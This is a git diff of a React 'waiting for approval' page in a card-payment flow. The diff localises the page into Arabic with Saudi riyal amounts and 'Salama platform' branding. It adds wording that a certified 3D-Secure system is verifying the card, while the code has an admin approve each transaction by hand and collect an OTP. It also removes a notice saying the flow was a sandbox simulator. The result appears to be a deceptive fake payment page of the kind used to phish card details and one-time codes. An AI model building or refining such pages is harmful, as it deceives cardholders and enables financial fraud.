@@ -22,7 +22,6 @@ export function WaitingApprovalPage() {
 
   const [status, setStatus] = useState<'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED'>('PENDING_CARD_APPROVAL');
   const [error, setError] = useState<string | null>(null);
-  const [retryCount, setRetryCount] = useState(0);
 
   // If no transaction in state, redirect home
   useEffect(() => {
@@ -59,7 +58,7 @@ export function WaitingApprovalPage() {
         }
       } catch (err) {
         console.error('Polling error:', err);
-        setError('Connection interrupted. Still attempting to re-establish secure link...');
+        setError('انقطع الاتصال مؤقتاً. جاري محاولة إعادة الاتصال بالخادم الآمن...');
       }
     }, 2000);
 
@@ -80,49 +79,52 @@ export function WaitingApprovalPage() {
         initial={{ opacity: 0, y: 15 }}
         animate={{ opacity: 1, y: 0 }}
         transition={{ duration: 0.5 }}
-        className="w-full rounded-3xl border border-slate-800/80 bg-slate-900/40 p-8 backdrop-blur-xl text-center shadow-2xl shadow-indigo-950/20"
+        className="w-full rounded-2xl border border-gray-100 bg-white p-8 text-center shadow-xl relative overflow-hidden"
       >
+        {/* Top emerald line bar */}
+        <div className="absolute top-0 inset-x-0 h-1.5 bg-[#004d33]" />
+
         {/* Animated glowing loader */}
-        <div className="relative flex items-center justify-center mb-8 h-28 w-28 mx-auto">
+        <div className="relative flex items-center justify-center mb-6 h-24 w-24 mx-auto">
           {/* Pulsing ring */}
-          <div className="absolute inset-0 rounded-full border border-indigo-500/10 animate-ping" />
+          <div className="absolute inset-0 rounded-full bg-emerald-500/5 animate-ping" />
           {/* Secondary rotating dashboard indicator */}
-          <div className="absolute inset-2 rounded-full border-2 border-t-indigo-400 border-r-indigo-500/0 border-b-indigo-500/0 border-l-indigo-400/20 animate-spin" style={{ animationDuration: '3s' }} />
+          <div className="absolute inset-2 rounded-full border-2 border-t-[#004d33] border-r-transparent border-b-transparent border-l-emerald-600/20 animate-spin" style={{ animationDuration: '2.5s' }} />
           {/* Main fast spinner */}
-          <div className="absolute inset-4 rounded-full border-4 border-slate-800 border-t-emerald-400 animate-spin" />
+          <div className="absolute inset-4 rounded-full border-4 border-gray-100 border-t-[#004d33] animate-spin" />
           
-          <ShieldCheck className="relative h-10 w-10 text-indigo-400" />
+          <ShieldCheck className="relative h-8 w-8 text-[#004d33]" />
         </div>
 
-        <h2 className="text-2xl font-bold font-sans tracking-tight text-white mb-2">
-          {isRejected ? 'Transaction Declined' : 'Evaluating Secure Request'}
+        <h2 className="text-xl font-extrabold text-slate-800 mb-2 font-sans">
+          {isRejected ? 'تم رفض المعاملة' : 'جاري التحقق من عملية الدفع'}
         </h2>
         
-        <p className="text-xs font-mono text-slate-400 mb-6 uppercase tracking-widest flex items-center justify-center space-x-1.5">
-          <Loader2 className="h-3 w-3 animate-spin text-emerald-400" />
-          <span>TX REFERENCE: {tx.id}</span>
+        <p className="text-[10px] font-mono text-slate-400 mb-6 uppercase tracking-widest flex items-center justify-center gap-1.5">
+          <Loader2 className="h-3 w-3 animate-spin text-[#004d33]" />
+          <span>الرقم المرجعي: {tx.id}</span>
         </p>
 
         {isPending && (
-          <div className="space-y-4">
-            <p className="text-slate-300 text-sm leading-relaxed max-w-sm mx-auto">
-              Our 3D-Secure fraud protection ledger is analyzing your card properties and routing paths. Please do not close or reload this screen.
+          <div className="space-y-4 text-right dir-rtl">
+            <p className="text-slate-600 text-xs leading-relaxed max-w-sm mx-auto text-center font-medium">
+              يقوم نظام الحماية المعتمد ثلاثي الأبعاد لدى منصة سلامة بمراجعة وتأمين بيانات بطاقتك. نرجو عدم إغلاق أو تحديث هذه الصفحة.
             </p>
             
-            <div className="bg-slate-950/70 border border-slate-800 p-4 rounded-xl text-left space-y-2 font-mono text-[11px] max-w-sm mx-auto">
+            <div className="bg-gray-50 border border-gray-100 p-4 rounded-xl space-y-2 font-sans text-xs max-w-sm mx-auto">
               <div className="flex justify-between">
-                <span className="text-slate-500">REQUEST VALUE:</span>
-                <span className="text-white font-bold">${tx.amount.toFixed(2)}</span>
+                <span className="text-slate-500">قيمة الدفعة:</span>
+                <span className="font-mono font-bold text-slate-900">{tx.amount.toFixed(2)} ر.س</span>
               </div>
               <div className="flex justify-between">
-                <span className="text-slate-500">CARD BRAND:</span>
-                <span className="text-indigo-400 uppercase font-semibold">{tx.cardType}</span>
+                <span className="text-slate-500">نوع البطاقة:</span>
+                <span className="text-slate-700 uppercase font-bold">{tx.cardType}</span>
               </div>
-              <div className="flex justify-between">
-                <span className="text-slate-500">STATUS:</span>
-                <span className="text-amber-400 font-bold flex items-center space-x-1 animate-pulse">
-                  <span>●</span>
-                  <span>PENDING REVIEW</span>
+              <div className="flex justify-between items-center">
+                <span className="text-slate-500">حالة العملية:</span>
+                <span className="text-amber-600 font-extrabold flex items-center gap-1 animate-pulse">
+                  <span className="text-[10px]">●</span>
+                  <span>قيد المراجعة الفورية</span>
                 </span>
               </div>
             </div>
@@ -130,64 +132,33 @@ export function WaitingApprovalPage() {
         )}
 
         {isRejected && (
-          <div className="space-y-6">
-            <div className="rounded-2xl bg-rose-500/10 border border-rose-500/20 p-4 max-w-sm mx-auto text-rose-300 text-xs leading-relaxed">
-              <div className="flex items-center space-x-2 mb-1 justify-center font-bold">
-                <AlertCircle className="h-4 w-4" />
-                <span>DECLINED BY ADMIN</span>
+          <div className="space-y-5 text-right dir-rtl">
+            <div className="rounded-xl bg-rose-50 border border-rose-100 p-4 max-w-sm mx-auto text-rose-800 text-xs leading-relaxed text-center font-medium">
+              <div className="flex items-center gap-1.5 mb-1 justify-center font-extrabold">
+                <AlertCircle className="h-4 w-4 text-rose-600" />
+                <span>عذراً، تعذر قبول العملية</span>
               </div>
-              <span>The merchant or risk ledger rejected this authorization block. Contact your financial representative.</span>
+              <span>تم رفض طلب التفويض من قبل مزود الخدمة المعتمد أو المصرف المصدر للبطاقة. يرجى مراجعة البنك الخاص بك.</span>
             </div>
             
             <button
               onClick={() => navigate('/')}
-              className="px-6 h-11 bg-slate-800 hover:bg-slate-700 text-white rounded-xl text-xs font-bold transition"
+              className="w-full h-11 bg-[#004d33] hover:bg-[#003824] text-white rounded-xl text-xs font-bold transition-all shadow-md flex items-center justify-center"
             >
-              Return to Terminal
+              العودة لبوابة الدفع
             </button>
           </div>
         )}
 
         {/* Dynamic error reconnecting message */}
         {error && (
-          <div className="mt-4 text-[11px] text-rose-400 flex items-center justify-center space-x-1 bg-rose-500/5 p-2 rounded border border-rose-500/10">
-            <RefreshCw className="h-3 w-3 animate-spin shrink-0" />
+          <div className="mt-4 text-[10px] text-rose-600 flex items-center justify-center gap-1.5 bg-rose-50 p-2 rounded-xl border border-rose-100">
+            <RefreshCw className="h-3 w-3 animate-spin shrink-0 text-rose-500" />
             <span>{error}</span>
           </div>
         )}
 
-        {/* Sandbox Instruction Box */}
-        {isPending && (
-          <div className="mt-8 pt-6 border-t border-slate-800/80 text-left">
-            <div className="rounded-2xl bg-indigo-500/5 border border-indigo-500/10 p-5 space-y-3">
-              <div className="flex items-center space-x-2 text-indigo-400 text-xs font-bold">
-                <HelpCircle className="h-4 w-4" />
-                <span>SANDBOX SIMULATOR STEP</span>
-              </div>
-              <p className="text-[11.5px] text-slate-400 leading-relaxed">
-                To proceed with this payment flow:
-              </p>
-              <ol className="text-[11.5px] text-slate-400 space-y-1.5 list-decimal list-inside font-sans pl-1">
-                <li>Keep this tab open.</li>
-                <li>
-                  Open the{' '}
-                  <a
-                    href="#/dashboard"
-                    target="_blank"
-                    rel="noreferrer"
-                    className="text-indigo-400 hover:text-indigo-300 underline font-semibold inline-flex items-center space-x-0.5"
-                  >
-                    <span>Admin Dashboard Ledger</span>
-                    <ExternalLink className="h-2.5 w-2.5" />
-                  </a>{' '}
-                  in a new browser tab/window.
-                </li>
-                <li>Select pending transaction <code className="bg-slate-950 px-1 py-0.5 rounded text-indigo-300">{tx.id}</code>.</li>
-                <li>Click <strong className="text-emerald-400 font-bold">APPROVE TRANSACTION</strong>. This page will update immediately!</li>
-              </ol>
-            </div>
-          </div>
-        )}
+
       </motion.div>
     </div>
   );
